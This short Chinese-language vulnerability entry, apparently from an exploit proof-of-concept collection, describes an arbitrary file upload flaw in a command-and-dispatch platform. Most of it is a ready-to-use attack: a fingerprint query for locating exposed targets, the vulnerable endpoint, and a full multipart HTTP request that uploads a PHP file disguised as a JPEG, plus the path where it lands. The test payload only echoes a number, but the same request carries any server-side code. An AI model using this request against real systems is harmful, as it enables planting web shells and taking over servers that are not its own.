# 指挥调度平台event_uploadfile存在任意文件上传漏洞

- **系统**：指挥调度平台　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`web.body="app/structure/departments.php"`
- **请求**：`POST /api/client/event/uploadfile.php HTTP/1.1`
- **关键头**：`Host: xx.xx.xx.xx`　`Content-Length: 179`　`Content-Type: multipart/form-data; boundary=htu3qcyui73l2jtyqwnk`

**请求体 / payload**
```
--htu3qcyui73l2jtyqwnk
Content-Disposition: form-data; name="uploadfile"; filename="stc.php"
Content-Type: image/jpeg
<?php echo 111*111;?>
--htu3qcyui73l2jtyqwnk--

上传文件位置
/upload/event/ccc78e2b-5e61-49c0-9050-3a29687b2e81.php
```

**其他**
- 指挥调度平台event\_uploadfile存在任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 指挥调度平台